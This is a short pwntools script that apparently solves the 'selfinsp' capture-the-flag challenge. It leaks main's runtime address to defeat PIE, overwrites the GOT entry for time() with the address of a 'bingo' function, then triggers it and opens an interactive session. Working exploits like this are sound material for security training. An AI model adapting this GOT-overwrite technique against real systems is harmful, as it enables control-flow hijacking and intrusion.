from pwn import *

r = remote('selfinsp',8000)

elf = ELF('./chals/selfinsp/selfinsp')

main_sym_addr = elf.symbols['main']
bingo_sym_addr = elf.symbols['bingo']
time_got = elf.got['time']



r.sendlineafter('> ','show main')
real_main_sym_addr = int(r.recvline().decode('ascii').split()[2],0)
print("real_main_sym_addr",hex(real_main_sym_addr))
print("main_sym_addr 0x{:x} bingo_sym_addr 0x{:x} time_got {:x}".format(main_sym_addr,bingo_sym_addr,time_got))
offset = real_main_sym_addr - main_sym_addr


r.sendlineafter('> ','write 0x{:x} 0x{:x}'.format(offset+time_got,offset+bingo_sym_addr))
print(r.recvline().decode('ascii'))



r.sendlineafter('> ','show bingo')
print(r.recvline().decode('ascii'))
print("bingo _sym_addr {:x}".format(offset + bingo_sym_addr))
r.sendlineafter('> ','call timestamp')
r.interactive()
